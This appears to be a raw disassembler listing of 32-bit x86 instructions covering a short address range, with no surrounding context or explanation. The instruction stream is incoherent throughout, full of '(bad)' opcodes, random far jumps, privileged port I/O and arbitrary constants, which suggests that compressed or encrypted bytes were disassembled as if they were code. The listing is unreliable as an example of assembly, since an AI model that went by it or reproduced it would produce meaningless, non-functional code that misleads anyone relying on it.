  41730d:	imul   esp,DWORD PTR [edx+ebx*1+0x39],0x75
  417312:	xor    cl,bh
  417314:	inc    ebx
  417315:	outs   dx,BYTE PTR ds:[esi]
  417316:	dec    eax
  417317:	fdiv   DWORD PTR [eax+0x4a]
  41731a:	ss test al,0x17
  41731d:	(bad)  
  41731e:	jae    0x41730d
  417320:	mov    dl,ah
  417322:	push   0x767bf8b2
  417327:	sahf   
  417328:	mov    ch,0x6c
  41732a:	lea    edi,[eax]
  41732c:	mov    ds:0xd185f92f,al
  417331:	and    BYTE PTR ds:0x57dedfe6,0x50
  417338:	cmp    edx,esi
  41733a:	mov    ebx,0x4363dd3f
  41733f:	loop   0x41737f
  417341:	(bad)  
  417342:	xor    bl,dh
  417344:	sbb    BYTE PTR [ecx+eiz*4+0x7c38d574],bl
  41734b:	js     0x417389
  41734d:	loopne 0x4172ed
  41734f:	dec    al
  417351:	fsub   DWORD PTR [eax+0x73]
  417354:	xchg   ebx,eax
  417355:	pop    ebp
  417356:	jne    0x417347
  417358:	sbb    al,0x86
  41735a:	xchg   edx,eax
  41735b:	icebp  
  41735c:	hlt    
  41735d:	leave  
  41735e:	jmp    0x56b9a40a
  417363:	ret    
  417364:	add    bl,cl
  417366:	mov    al,0xe1
  417368:	mov    WORD PTR [eax+0x1088cad5],ds
  41736e:	inc    esi
  41736f:	pushf  
  417370:	add    BYTE PTR [esi+ecx*8],dh
  417373:	mov    ebp,0xffeb8a01
  417379:	mov    BYTE PTR [ecx],bl
  41737b:	or     DWORD PTR [edx+0x4d3b41cf],ebp
  417381:	xor    esp,DWORD PTR [edx]
  417383:	cmp    DWORD PTR [esi+0x1fd5be6],0x22
  41738a:	push   eax
  41738b:	lahf   
  41738c:	mov    bh,0x7f
  41738e:	jnp    0x4173cd
  417390:	mov    al,ds:0x381222a7
  417395:	sbb    BYTE PTR [ecx+edx*2-0x37],0xad
  41739a:	mov    WORD PTR [eax],es
  41739c:	push   ss
  41739d:	mov    ch,0x2c
  41739f:	sahf   
  4173a0:	push   esp
  4173a1:	xor    bh,BYTE PTR [eax+0x71]
  4173a4:	and    eax,0xba78473c
  4173a9:	scas   eax,DWORD PTR es:[edi]
  4173aa:	pop    ebp
  4173ab:	test   al,0xaf
  4173ad:	fiadd  WORD PTR [ebx]
  4173af:	inc    edi
  4173b0:	jnp    0x4173fe
  4173b2:	int    0x7f
  4173b4:	and    esp,0x5e64741a
  4173ba:	sar    esp,1
  4173bc:	sub    bl,BYTE PTR [esi+0x4f]
  4173bf:	jmp    0x4083:0x13572da5
  4173c6:	xor    DWORD PTR [ebp+0x79],edi
  4173c9:	cmp    eax,esp
  4173cb:	pop    esi
  4173cc:	int3   
  4173cd:	pop    es
  4173ce:	jb     0x4173c8
  4173d0:	popw   ss
  4173d2:	je     0x41738c
  4173d4:	(bad)  
  4173d5:	loop   0x417389
  4173d7:	test   eax,0x79252ac8
  4173dc:	stos   DWORD PTR es:[edi],eax
  4173dd:	xchg   ebx,eax
  4173de:	add    al,BYTE PTR fs:[ebx+esi*8+0x1a]
  4173e3:	in     al,dx
  4173e4:	and    dl,dh
  4173e6:	ss sbb ch,dl
  4173e9:	inc    edi
  4173ea:	cmp    al,0x52
  4173ec:	es jmp 0x41737d
  4173ef:	xor    bh,BYTE PTR [eax-0x31e6ca8a]
  4173f5:	test   DWORD PTR [ebp+0x26bcceb0],eax
  4173fb:	imul   esi,ebx,0xffffff88
  4173fe:	pop    esi
  417400:	ret    0x2ca5
  417403:	sub    bh,dl
  417405:	inc    ebx
  417406:	jnp    0x417427
  417408:	icebp  
  417409:	shl    edx,0xc4
  41740c:	fisubr WORD PTR [eax+0x78]
  41740f:	test   eax,0x6b27ccf1
  417414:	out    0xcf,eax
  417416:	fmul   DWORD PTR [esi-0x36]
  417419:	xlat   BYTE PTR ds:[ebx]
  41741a:	or     esp,DWORD PTR ds:0x43f4849a
  417420:	jmp    edx
  417422:	aaa    
  417423:	fistp  DWORD PTR [esi+ecx*1]
  417426:	push   cs
  417427:	cdq    
  417428:	cmp    DWORD PTR [edi],ecx
  41742a:	fcmove st,st(3)
  41742c:	shl    DWORD PTR [edi],cl
  41742e:	(bad)  
  41742f:	inc    ebp
  417430:	pop    es
  417431:	aam    0xc
  417433:	rcl    DWORD PTR ds:0xba341da9,0xb2
  41743a:	adc    bh,bh
  41743c:	mov    edi,0x19b0ca03
  417441:	retf   0x8f73
  417444:	pop    ebp
  417445:	or     BYTE PTR [ecx+edx*1-0x30841319],dh
  41744c:	adc    eax,0xb549d210
  417451:	xor    al,0xf
  417453:	mov    dl,0x1a
  417455:	test   BYTE PTR [ebx+0x52edc40b],bl
  41745b:	(bad)  
  41745c:	les    esi,FWORD PTR [ecx+0x1]
  41745f:	cmp    al,0x26
  417461:	mov    esi,es
  417463:	sbb    BYTE PTR [ebp+0x1ae95efd],0x35
  41746a:	pop    esp
  41746b:	cmps   DWORD PTR ss:[esi],DWORD PTR es:[edi]
  41746d:	leave  
  41746e:	xor    edi,ebp
  417470:	into   
  417471:	jnp    0x4174cd
  417473:	push   ds
  417474:	stos   DWORD PTR es:[edi],eax
  417475:	call   DWORD PTR [edx-0x50]
  417478:	in     eax,dx
  417479:	nop
  41747a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41747b:	bound  esp,QWORD PTR [edx-0x47]
  41747e:	adc    ebp,DWORD PTR [di-0x52]
  417482:	pop    esp
  417483:	mov    bh,ah
  417485:	ins    BYTE PTR es:[edi],dx
  417486:	int    0xe2
  417488:	add    eax,0xd8010d99
  41748d:	jg     0x41742b
  41748f:	adc    ch,0x1c
  417492:	out    0x3d,eax
  417494:	scas   al,BYTE PTR es:[edi]
  417495:	outs   dx,DWORD PTR ds:[esi]
  417496:	sub    BYTE PTR [ecx-0x7858a9b8],ah
  41749c:	mov    ebx,0xb8e0ffc3
  4174a1:	lahf   
  4174a2:	inc    ecx
  4174a3:	cmp    ebp,DWORD PTR [esi+0x6baf0ec3]
  4174a9:	mov    ecx,0x4ddb0a2b
  4174ae:	test   al,0xe5
  4174b0:	clc    
  4174b1:	in     al,dx
  4174b2:	aam    0xb9
  4174b4:	ds sbb esi,esi
  4174b7:	lock push ds
  4174b9:	sahf   
  4174ba:	sub    ebx,ebx
  4174bc:	(bad)  
  4174bd:	fistp  QWORD PTR [edx-0x58]
  4174c0:	mov    ds:0xddd8efd0,eax
  4174c5:	clc    
  4174c6:	outs   dx,BYTE PTR ds:[esi]
  4174c7:	mov    edi,0xa7cc9ceb
  4174cc:	loopne 0x4174d9
  4174ce:	sub    BYTE PTR [ebx-0x4],0xa
  4174d2:	neg    DWORD PTR [edx-0x43]
  4174d5:	sub    esp,edx
  4174d7:	pop    sp
  4174d9:	inc    edx
  4174da:	sti    
  4174db:	(bad)  
  4174dc:	jns    0x4174a0
  4174de:	sbb    BYTE PTR [esi-0x5a],al
  4174e1:	aaa    
  4174e2:	frstor [esi]
  4174e4:	(bad)  [ebx+0x355eb9f0]
  4174ea:	rol    BYTE PTR [ecx-0x21b35c10],1
  4174f0:	push   esi
  4174f1:	scas   al,BYTE PTR es:[edi]
  4174f2:	adc    al,0x9e
  4174f4:	jb     0x41751b
  4174f6:	cmovb  edi,DWORD PTR [edi-0x42]
  4174fa:	mov    bl,0x7a
  4174fc:	pop    ebx
  4174fd:	rcr    DWORD PTR [ebx+0x47023f3f],0x1d
  417504:	xchg   ecx,eax
  417505:	es int 0xc8
  417508:	sub    al,0x85
  41750a:	rcr    BYTE PTR [edi-0x3e],0x43
  41750e:	repz push cs
  417510:	mov    dl,0xf1
  417512:	mov    ds:0x87458dc9,eax
  417517:	test   al,0x4
  417519:	cmp    ch,BYTE PTR [ecx+0x5e422c62]
  41751f:	mov    ah,0x6e
  417521:	ffreep st(5)
  417523:	mov    bl,0xea
  417525:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417526:	xchg   esp,eax
  417527:	push   eax
  417528:	add    DWORD PTR [eax-0x1c715e8d],ebp
  41752e:	iret   
  41752f:	ret    
  417530:	scas   eax,DWORD PTR es:[edi]
  417531:	inc    ebx
  417532:	cmp    bh,dh
  417534:	mov    ebp,ecx
  417536:	aaa    
  417537:	add    bl,BYTE PTR [edx+0x5e]
  41753a:	mov    al,0x8d
  41753c:	mov    BYTE PTR [edx+eiz*8],dh
  41753f:	das    
  417540:	fldcw  WORD PTR [edx]
  417542:	retf   0x7415
  417545:	dec    ebx
  417546:	pop    ebx
  417547:	jmp    0xda5ceefd
  41754c:	add    DWORD PTR [eax+0x0],ecx
  41754f:	vpunpcklqdq ymm0,ymm3,ymm5
  417554:	push   ebx
  417555:	in     al,dx
  417556:	xor    esi,ecx
  417558:	xor    eax,0xd2b589ae
  41755d:	ret    0x7ed1
  417560:	jbe    0x4175a2
  417562:	ret    
  417563:	ficom  WORD PTR [edi]
  417565:	out    dx,al
  417566:	loopne 0x41756a
  417568:	dec    edi
  417569:	icebp  
  41756a:	gs fs dec edi
  41756d:	nop
  41756e:	mov    ecx,0x4ddd7545
  417573:	retf   0x1536
  417576:	adc    al,0xdf
  417578:	lds    edi,FWORD PTR [ecx-0x594b3657]
  41757e:	jmp    0x4175c5
  417580:	aas    
  417581:	fnstenv [edx+0x54e2e144]
  417587:	or     BYTE PTR ds:0x9ef104b2,dh
  41758d:	cmp    DWORD PTR [ecx+0x404ebe6f],esp
  417593:	and    BYTE PTR [esp+ebx*8],0x8b
  417597:	mov    DWORD PTR [esi+0x6f],ebp
  41759a:	pop    ss
  41759b:	call   0x5363:0xa71cf3ad
  4175a2:	shl    DWORD PTR [ebp+0x29],cl
  4175a5:	popa   
  4175a6:	test   eax,0x276a68
  4175ab:	jmp    0x5b1c:0x4efec3c0
  4175b2:	out    dx,eax
  4175b3:	sub    edi,DWORD PTR [edi]
  4175b5:	inc    ebx
  4175b6:	sbb    esi,DWORD PTR [edx-0x42]
  4175b9:	outs   dx,DWORD PTR ds:[esi]
  4175ba:	js     0x4175bb
  4175bc:	xchg   ecx,eax
  4175bd:	hlt    
  4175be:	cmp    DWORD PTR [edx-0x4f2ab8ee],esi
  4175c4:	imul   eax,DWORD PTR [ebx+edx*2-0x1f],0xfffffff3
  4175c9:	inc    edi
  4175ca:	pop    edi
  4175cb:	repz cmps BYTE PTR es:[esi],BYTE PTR es:[edi]
  4175ce:	push   edx
  4175cf:	mov    dl,0x2d
  4175d1:	cmp    al,0x87
  4175d3:	or     al,0x19
  4175d5:	push   ecx
  4175d6:	mov    esp,DWORD PTR [ebx+0x36e0ae10]
  4175dc:	aaa    
  4175dd:	mov    bh,0xbd
  4175df:	and    esi,DWORD PTR [ecx+0x49]
  4175e2:	push   ebx
  4175e3:	or     DWORD PTR [ecx],ecx
  4175e5:	fisttp QWORD PTR [esi]
  4175e7:	cwde   
  4175e8:	outs   dx,BYTE PTR ds:[esi]
  4175e9:	mov    ecx,0xfe10647a
  4175ee:	call   0x58a:0x797d3fd0
  4175f5:	stc    
  4175f6:	daa    
  4175f7:	cli    
  4175f8:	(bad)  
  4175f9:	cmp    ebp,DWORD PTR [ebx-0x486d101c]
  4175ff:	adc    edx,DWORD PTR [eax-0x15ec6803]
  417605:	leave  
  417606:	or     BYTE PTR [esi+ebp*8-0x12],ah
  41760a:	out    dx,al
  41760b:	fnstenv [ecx+0x451b791c]
  417611:	ret    
  417612:	popa   
  417613:	xchg   edx,eax
  417614:	dec    edx
  417615:	inc    edi
  417616:	sbb    di,bp
  417619:	jge    0x4175d3
  41761b:	mov    bh,0x62
  41761d:	js     0x4175bd
  41761f:	fst    QWORD PTR [eax+0x77dad62d]
  417625:	add    bl,ch
  417627:	shr    DWORD PTR [edi],0xb2
  41762a:	dec    esp
  41762b:	or     ecx,DWORD PTR [ebx-0x2c229849]
  417631:	or     esi,edi
  417633:	mov    ebp,0x620e5ea5
  417638:	fsub   DWORD PTR [ebx-0x64eee5f4]
  41763e:	jbe    0x4175d2
  417640:	(bad)  
  417641:	nop
  417642:	cwde   
  417643:	mov    ecx,esi
  417645:	frstor [ecx+0x43]
  417648:	loopne 0x417671
  41764a:	jo     0x417613
  41764c:	cmp    DWORD PTR [eax-0x4],ecx
  41764f:	xchg   DWORD PTR ds:0x82b49d0c,eax
  417655:	jecxz  0x41766d
  417657:	sub    cl,BYTE PTR [esi-0xc16790d]
  41765d:	sahf   
  41765e:	test   DWORD PTR [ecx+0x3d],0x1bee9bc2
  417665:	dec    eax
  417666:	fnstcw WORD PTR [esp+ebx*1+0x5a]
  41766a:	jp     0x4176d6
  41766c:	ja     0x4176c0
  41766e:	(bad)  
  417670:	pop    eax
  417671:	lahf   
  417672:	inc    esp
  417673:	mov    al,0xe7
  417675:	add    eax,eax
  417677:	add    BYTE PTR [ecx-0x1e1e9780],dh
  41767d:	mov    cl,0x51
  41767f:	sbb    eax,0x694399
  417684:	inc    esi
  417685:	cmc    
  417686:	jle    0x4176c8
  417688:	clc    
  417689:	dec    esi
  41768a:	es dec edi
  41768c:	repz dec ebp
  41768e:	mov    eax,ds:0x8917989b
  417693:	mov    edi,0x79315050
  417698:	(bad)  
  417699:	std    
  41769a:	in     al,dx
  41769b:	add    al,0xbd
  41769d:	jmp    esi
  41769f:	(bad)  
  4176a0:	cmp    BYTE PTR [edx-0x6d],ah
  4176a3:	mov    bl,0x73
  4176a5:	xlat   BYTE PTR ds:[ebx]
  4176a6:	and    DWORD PTR [ebp+0x5e],ebx
  4176a9:	pop    ecx
  4176aa:	clc    
  4176ab:	sub    al,0x2a
  4176ad:	jno    0x4176d7
  4176af:	popf   
  4176b0:	idiv   DWORD PTR [eax-0x64]
  4176b3:	inc    edx
  4176b4:	ret    
  4176b5:	clc    
  4176b6:	scas   eax,DWORD PTR es:[edi]
  4176b7:	int3   
  4176b8:	mov    bl,0x9
  4176ba:	frstor [ecx-0x37]
  4176bd:	mov    ch,0x37
  4176bf:	scas   eax,DWORD PTR es:[edi]
  4176c0:	inc    edx
  4176c1:	pop    es
  4176c2:	xor    ax,0x8625
  4176c6:	xor    BYTE PTR [ebp+0x694653cd],ah
  4176cc:	in     al,dx
  4176cd:	dec    edi
  4176ce:	or     eax,0xe224ef67
  4176d3:	sbb    eax,0x5bcb344f
  4176d8:	push   cs
  4176d9:	jb     0x41772f
  4176db:	mov    ah,0x88
  4176dd:	adc    BYTE PTR [eax],bl
  4176df:	fstp   QWORD PTR [edi+0x50770c8f]
  4176e5:	addr16 pop edi
  4176e7:	push   ecx
  4176e8:	or     al,0x74
  4176ea:	outs   dx,DWORD PTR ds:[esi]
  4176eb:	in     al,dx
  4176ec:	mov    edx,0x13145da7
  4176f1:	inc    edi
  4176f2:	sub    al,0x56
  4176f4:	mov    cl,0x78
  4176f6:	push   esp
  4176f7:	add    al,0x5c
  4176f9:	rcr    eax,cl
  4176fb:	mov    esp,0x7b6eb023
  417700:	jle    0x417749
  417702:	pop    edx
  417703:	div    al
  417705:	lds    esi,FWORD PTR [ecx+0x5ac7364]
  41770b:	retf   0x7a37
  41770e:	out    dx,eax
  41770f:	cmp    bl,bh
  417711:	aam    0xf4
  417713:	pop    ebx
  417714:	loopne 0x41778a
  417716:	sahf   
  417717:	js     0x4176cd
  417719:	mov    ch,0x72
  41771b:	fnstenv [edi-0x34]
  41771e:	jo     0x4176d7
  417720:	stos   BYTE PTR es:[edi],al
  417721:	adc    ecx,DWORD PTR [edi]
  417723:	into   
  417724:	ret    
  417725:	aaa    
  417726:	pop    edx
  417727:	inc    ebx
  417728:	or     eax,0x7e7076fe
  41772d:	outs   dx,BYTE PTR ds:[esi]
  41772e:	mov    ds:0x7904d92c,al
  417733:	das    
  417734:	and    al,0xa8
  417736:	mov    dh,BYTE PTR [edi]
  417738:	shr    BYTE PTR [edi-0x6],cl
  41773b:	push   ebx
  41773c:	popa   
  41773d:	xchg   esi,eax
  41773e:	push   edx
  41773f:	repz retf 
  417741:	dec    esi
  417742:	pop    es
  417743:	and    eax,0x4b230224
  417748:	(bad)  
  417749:	gs mov edi,0xb842786a
  41774f:	fist   WORD PTR [edx+0x94b9d62]
  417755:	or     ebx,DWORD PTR [ebp+ebp*8-0x34]
  417759:	xchg   ecx,eax
  41775a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41775b:	or     edx,edi
  41775d:	jmp    0xdfaf10f
  417762:	pop    ss
  417763:	test   al,0xe
  417765:	sti    
  417766:	test   al,0x18
  417768:	das    
  417769:	ja     0x41774c
  41776b:	mov    ah,0xf9
  41776d:	pop    es
  41776e:	inc    eax
  41776f:	push   ds
  417770:	loop   0x417749
  417772:	fcomp  QWORD PTR [eax]
  417774:	cmp    dh,bl
  417776:	scas   eax,DWORD PTR es:[edi]
  417777:	icebp  
  417778:	xor    edx,DWORD PTR [edi]
  41777a:	fild   DWORD PTR [ecx+eax*1]
  41777d:	jecxz  0x41771e
  41777f:	fdivr  QWORD PTR [eax-0x79e910fa]
  417785:	jmp    0x41771a
  417787:	sub    al,0xfb
  417789:	push   ebx
  41778a:	nop
  41778b:	fdiv   st,st(0)
  41778d:	jne    0x417733
  41778f:	leave  
  417790:	jmp    0xe12c:0xe314addb
  417797:	lock lods eax,DWORD PTR ds:[esi]
  417799:	aad    0xd
  41779b:	gs int 0x6c
  41779e:	sub    al,BYTE PTR [ecx+edx*1+0x59254b28]
  4177a5:	and    eax,0x9c4d2775
  4177aa:	mov    ds:0xa664cb3c,al
  4177af:	scas   eax,DWORD PTR es:[edi]
  4177b0:	fwait
  4177b1:	(bad)  
  4177b2:	lods   eax,DWORD PTR ds:[esi]
  4177b3:	mov    dh,0x4
  4177b5:	sub    ch,BYTE PTR [ebx+ebx*2-0x6e769089]
  4177bc:	pop    es
  4177bd:	push   0xfffffffc
  4177bf:	in     al,dx
  4177c0:	push   ss
  4177c1:	fnstenv [ebx-0x34]
  4177c4:	(bad)  
  4177c5:	sahf   
  4177c6:	out    dx,al
  4177c7:	test   DWORD PTR [esi],esp
  4177c9:	adc    DWORD PTR [edx],esp
  4177cb:	dec    edi
  4177cc:	jmp    0x4177ce
  4177ce:	add    DWORD PTR [edx],esp
  4177d0:	cli    
  4177d1:	sub    cl,BYTE PTR [eax-0x279f50dc]
  4177d7:	rol    al,cl
  4177d9:	adc    ah,BYTE PTR [ebp+esi*4-0x20f9bcf9]
  4177e0:	xchg   DWORD PTR cs:[esi],edx
  4177e3:	jmp    0xad8b:0xf928eb1
  4177ea:	and    ebp,edx
  4177ec:	dec    ebp
  4177ed:	dec    ebx
  4177ee:	scas   eax,DWORD PTR es:[edi]
  4177ef:	xor    bh,dh
  4177f1:	and    eax,0xa46e892c
  4177f6:	mov    ah,0x45
  4177f8:	and    ch,BYTE PTR [eax]
  4177fa:	push   cs
  4177fb:	in     eax,dx
  4177fc:	(bad)  
  4177fd:	imul   BYTE PTR [edi-0x43b3b211]
  417803:	dec    ecx
  417804:	arpl   WORD PTR [edx+0x21],ax
  417807:	enter  0xfebb,0xb3
  41780b:	push   edx
  41780c:	sbb    al,0x6d
  41780e:	or     al,BYTE PTR [edx-0x59]
  417811:	xchg   edi,eax
  417812:	sub    ebp,DWORD PTR cs:[ecx]
  417815:	add    DWORD PTR [edi+eiz*2-0x24],ecx
  417819:	add    ecx,eax
  41781b:	je     0x417859
  41781d:	or     al,0xb
  41781f:	int3   
  417820:	dec    ebx
  417821:	sbb    DWORD PTR [edx+0x23],ebx
  417824:	mov    ss,WORD PTR [ebp+0x30]
  417827:	pop    ds
  417828:	xor    esi,ebp
  41782a:	ins    BYTE PTR es:[edi],dx
  41782b:	popa   
  41782c:	xchg   edx,eax
  41782d:	dec    ebp
  41782e:	paddusb mm2,mm0
  417831:	cmc    
  417832:	in     al,0xf0
  417834:	aaa    
  417835:	xor    eax,DWORD PTR [eax+0x7e]
  417838:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417839:	js     0x41785f
  41783b:	es sbb eax,0xdd98f8f2
  417841:	mov    ebp,0xa58ea7c
  417846:	xor    al,0x4b
  417848:	out    0xfb,al
  41784a:	xchg   dh,cl
  41784c:	xor    ebx,esp
  41784e:	dec    eax
  41784f:	and    dl,bh
  417851:	xor    cl,dl
  417853:	cmp    al,0x3d
  417855:	cmp    esp,DWORD PTR [eax-0x54ca8f31]
  41785b:	dec    esi
  41785c:	mov    edi,0x7a97b6d9
  417861:	sub    BYTE PTR [ebx+0x9982cd5],cl
  417867:	cld    
  417868:	mov    dh,0x12
  41786a:	inc    ebp
  41786b:	adc    dh,BYTE PTR [edx+ecx*2-0x5f5eb51f]
  417872:	neg    DWORD PTR [esi]
  417874:	(bad)  
  417875:	mov    edx,0xa201ae73
  41787a:	pop    ds
  41787b:	jecxz  0x417877
  41787d:	mov    al,ds:0x764b8308
  417882:	call   0x97c60926
  417887:	mov    edx,0x3dbf6c94
  41788c:	icebp  
  41788d:	push   esp
  41788e:	into   
  41788f:	daa    
  417890:	shl    DWORD PTR [edi],1
  417892:	dec    esp
  417893:	test   al,al
  417895:	push   edi
  417896:	out    0xfc,al
  417898:	in     al,dx
  417899:	pop    edi
  41789a:	lahf   
  41789b:	xchg   esp,eax
  41789c:	int    0x2
  41789e:	xchg   esi,eax
  41789f:	cmp    edi,DWORD PTR [ebp+0x1c65adf]
  4178a5:	mov    WORD PTR [edi+0x32],fs
  4178a8:	mov    cl,bh
  4178aa:	or     al,0xe0
  4178ac:	add    BYTE PTR [edx+eiz*4],ch
  4178af:	test   al,0x8d
  4178b1:	loope  0x4178d9
  4178b3:	imul   esi,DWORD PTR [edx-0x45],0xffffff8f
  4178b7:	push   cs
  4178b8:	and    al,BYTE PTR [ecx]
  4178ba:	test   DWORD PTR [ebx+0x7934caa2],edx
  4178c0:	je     0x417920
  4178c2:	mov    ecx,0x1b1e7fed
  4178c7:	scas   al,BYTE PTR es:[edi]
  4178c8:	xor    BYTE PTR [edx],0xf5
  4178cb:	and    BYTE PTR [eax+0x54],ch
  4178ce:	cs push cs
  4178d0:	cmp    eax,0x8806013
  4178d5:	mov    edx,0x28b26a9a
  4178da:	add    eax,0xdde8b942
  4178df:	xor    DWORD PTR [esi],eax
  4178e1:	pcmpeqw mm3,mm4
  4178e4:	cmp    bl,BYTE PTR [edx-0x1b]
  4178e7:	or     BYTE PTR ds:0x5c01eedc,ah
  4178ed:	cmp    ah,dh
  4178ef:	repnz cmp ebp,eax
  4178f2:	dec    esp
  4178f3:	test   eax,0xf25e8349
  4178f8:	fsub   DWORD PTR [ebx+0x0]
  4178fb:	sub    DWORD PTR [edi-0x6a4dc63e],eax
  417901:	cmp    eax,0x9c7e5d05
  417906:	and    DWORD PTR [ebp-0x20ab747d],esp
  41790c:	mov    ds:0x8a214b30,al
  417911:	xchg   BYTE PTR [ecx],ah
  417913:	jg     0x4178fc
  417915:	cmc    
  417916:	mov    edi,0xb5fdb4b
  41791b:	add    al,0x4f
  41791d:	pushf  
  41791e:	scas   al,BYTE PTR es:[edi]
  41791f:	iret   
  417920:	jg     0x4178ce
  417922:	stc    
  417923:	sti    
  417924:	mov    bh,BYTE PTR [esi+0x4d]
  417927:	pushf  
  417928:	jle    0x4178b8
  41792a:	loopne 0x4178e5
  41792c:	test   DWORD PTR [esi-0x32],eax
  41792f:	frstor [ebp-0x6a7e7925]
  417935:	or     ah,ah
  417937:	push   ebx
  417938:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417939:	retf   
  41793a:	in     eax,dx
  41793b:	hlt    
  41793c:	ins    BYTE PTR es:[edi],dx
  41793d:	mov    ch,0x4c
  41793f:	test   eax,0xe9195ee5
  417944:	xchg   esp,eax
  417945:	pop    ebp
  417946:	or     eax,0x41aed3fe
  41794b:	(bad)  
  41794d:	adc    dh,dh
  41794f:	pop    ecx
  417950:	sbb    al,0x9b
  417952:	icebp  
  417953:	mov    dl,0xea
  417955:	cmp    bh,BYTE PTR [ecx]
  417957:	sub    eax,0x9e453e2
  41795c:	cs popa 
  41795e:	scas   eax,DWORD PTR es:[edi]
  41795f:	pop    edi
  417960:	ins    DWORD PTR es:[edi],dx
  417961:	fnstcw WORD PTR [edi-0x304b5915]
  417967:	sub    BYTE PTR ds:0x259cfded,dl
  41796d:	xchg   ebx,eax
  41796e:	in     eax,dx
  41796f:	dec    ecx
  417970:	addr16 adc al,ch
  417973:	cwde   
  417974:	jmp    0x5ae6:0x4c6e75f9
  41797b:	cwde   
  41797c:	add    al,0xff
  41797e:	popa   
  41797f:	dec    ebp
  417980:	push   ebx
  417981:	ret    0x67de
  417984:	jl     0x4179e5
  417986:	hlt    
  417987:	pop    eax
  417988:	loop   0x41792e
  41798a:	dec    eax
  41798b:	xchg   edx,eax
  41798c:	xchg   edx,eax
  41798d:	jge    0x4179f6
  41798f:	push   DWORD PTR [edx-0x5b327a82]
  417995:	icebp  
  417996:	in     eax,0xee
  417998:	out    0xa1,eax
  41799a:	dec    ebp
  41799b:	adc    eax,0xbcbbba68
  4179a0:	adc    ch,dl
  4179a2:	mov    edx,0xfe14a42d
  4179a7:	seto   bh
  4179aa:	pop    ebx
  4179ab:	addr16 cmp al,0x66
  4179ae:	or     BYTE PTR [ebp-0x2e7aedc],al
  4179b4:	loopne 0x4179b6
  4179b6:	cs in  eax,0x4a
  4179b9:	mov    esi,0x68bbeb
  4179be:	scas   eax,DWORD PTR es:[edi]
  4179bf:	cs nop
  4179c1:	nop
  4179c2:	cmp    al,0xe0
  4179c4:	daa    
  4179c5:	daa    
  4179c6:	clc    
  4179c7:	mov    ah,0x33
  4179c9:	repnz test esi,ebp
  4179cc:	cs or  al,0x94
  4179cf:	mov    ds:0xbdbe3481,eax
  4179d4:	xchg   ebp,eax
  4179d5:	mov    dh,BYTE PTR ds:0xb1ed571b
  4179db:	cmp    al,0x1a
  4179dd:	repnz sbb DWORD PTR [edi+0x1d],ebp
  4179e1:	(bad)  
  4179e2:	aad    0x6b
  4179e4:	repz icebp 
  4179e6:	mov    ebp,0x2b450acb
  4179eb:	jp     0x417a16
  4179ed:	mov    ebx,0xc1beb3f
  4179f2:	lods   al,BYTE PTR ds:[esi]
  4179f3:	imul   ebx,DWORD PTR [ebp+edi*8+0x5f],0x31
  4179f8:	add    dh,bh
  4179fa:	loope  0x4179c1
  4179fc:	neg    BYTE PTR [eax]
  4179fe:	ds mov bh,0x82
  417a01:	sti    
  417a02:	repz pop ecx
  417a04:	mov    al,0x4b
  417a06:	ja     0x417a2d
  417a08:	jns    0x417a54
  417a0a:	retf   0x1a7
  417a0d:	mov    ?,WORD PTR [esi-0x3b2ca76e]
  417a13:	arpl   WORD PTR [edx+esi*1-0x64e28e10],di
  417a1a:	stos   DWORD PTR es:[edi],eax
  417a1b:	and    BYTE PTR [ebp+0x6395e6be],cl
  417a21:	shl    DWORD PTR [edx+eiz*1+0x4e],cl
  417a25:	scas   eax,DWORD PTR es:[edi]
  417a26:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417a27:	mov    eax,ds:0xf1770609
  417a2c:	mov    dh,BYTE PTR [esi+0x2]
  417a2f:	push   es
  417a30:	push   ecx
  417a31:	mov    al,ds:0xa6113ed
  417a36:	mov    WORD PTR [edi-0x3dbd8c1e],gs
  417a3c:	(bad)  
  417a3d:	fcomp  QWORD PTR [edx-0x44]
  417a40:	xchg   edi,eax
  417a41:	inc    esi
  417a42:	pusha  
  417a43:	bound  edi,QWORD PTR [edi+0x47]
  417a46:	jae    0x417a98
  417a48:	je     0x417a26
  417a4a:	(bad)  
  417a4b:	shr    ecx,cl
  417a4d:	data16 jmp 0x417a80
  417a50:	push   edi
  417a51:	repnz fwait
  417a53:	mov    bl,0xa4
  417a55:	int    0xb1
  417a57:	and    edx,DWORD PTR [eax]
  417a59:	pushf  
  417a5a:	mov    edi,0xe253e121
  417a5f:	je     0x417a29
  417a61:	mov    ds:0x841f226d,eax
  417a66:	and    bh,dl
  417a68:	jne    0x4179f9
  417a6a:	dec    ebp
  417a6b:	jbe    0x417a85
  417a6d:	aaa    
  417a6e:	sub    eax,0x5f2387af
  417a73:	mov    es,edx
  417a75:	faddp  st(1),st
  417a77:	xchg   esi,eax
  417a78:	sbb    ebx,DWORD PTR [ebx+ecx*8]
  417a7b:	inc    ebx
  417a7c:	in     al,dx
  417a7d:	jl     0x417a2a
  417a7f:	dec    edi
  417a80:	ret    0x5fea
  417a83:	(bad)  
  417a84:	std    
  417a85:	mov    al,0xfe
  417a87:	(bad)  
  417a88:	jg     0x417a0f
  417a8a:	sahf   
  417a8b:	stos   BYTE PTR es:[edi],al
  417a8c:	adc    esi,DWORD PTR [ebx-0x396fd7fd]
  417a92:	or     dl,al
  417a94:	ret    0x4d60
  417a97:	fbld   TBYTE PTR [ecx+0x69]
  417a9a:	push   cs
  417a9b:	jmp    0x417a48
  417a9d:	aas    
  417a9e:	jmp    0x36225baf
  417aa3:	ds jo  0x417adc
  417aa6:	xchg   BYTE PTR [edx+0x7a6532e7],ch
  417aac:	(bad)  [edx+0x41228ca4]
  417ab2:	lock sti 
  417ab4:	and    ah,dl
  417ab6:	inc    edi
  417ab7:	or     esi,DWORD PTR [edi]
  417ab9:	adc    BYTE PTR [ecx],cl
  417abb:	add    DWORD PTR [edx-0x3163345a],ebx
  417ac1:	sbb    ch,BYTE PTR [esi+ecx*4]
  417ac4:	repz dec edi
  417ac6:	fistp  QWORD PTR [ecx]
  417ac8:	inc    ebx
  417ac9:	iret   
  417aca:	mov    bl,BYTE PTR [ecx+0x4a34b207]
  417ad0:	add    BYTE PTR [edi],dh
  417ad2:	and    ecx,DWORD PTR [ebp+edi*4+0x7765d280]
  417ad9:	or     BYTE PTR ds:0x1cf7b37c,ch
  417adf:	jp     0x417ad2
  417ae1:	push   es
  417ae2:	inc    ecx
  417ae3:	sahf   
